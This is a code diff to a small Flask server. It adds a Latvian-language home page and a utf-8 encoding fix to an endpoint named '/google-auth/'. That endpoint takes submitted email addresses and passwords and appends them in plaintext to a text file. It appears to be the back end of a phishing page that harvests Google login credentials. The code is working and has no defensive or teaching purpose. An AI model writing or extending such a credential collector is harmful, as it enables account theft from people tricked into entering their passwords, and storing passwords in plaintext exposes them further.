@@ -2,6 +2,10 @@ from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
+@app.route('/')
+def home():
+    return "Sveiks! Šis ir mans Flask serveris."
+
 @app.route('/google-auth/', methods=['POST'])
 def save_credentials():
     data = request.get_json()
@@ -9,7 +13,7 @@ def save_credentials():
     password = data.get('password')
     if not email or not password:
         return jsonify({'error': 'Missing email or password'}), 400
-    with open('credentials.txt', 'a') as f:
+    with open('credentials.txt', 'a', encoding='utf-8') as f:
         f.write(f"Email: {email}, Password: {password}\n")
     return jsonify({'message': 'Credentials saved'}), 200
 
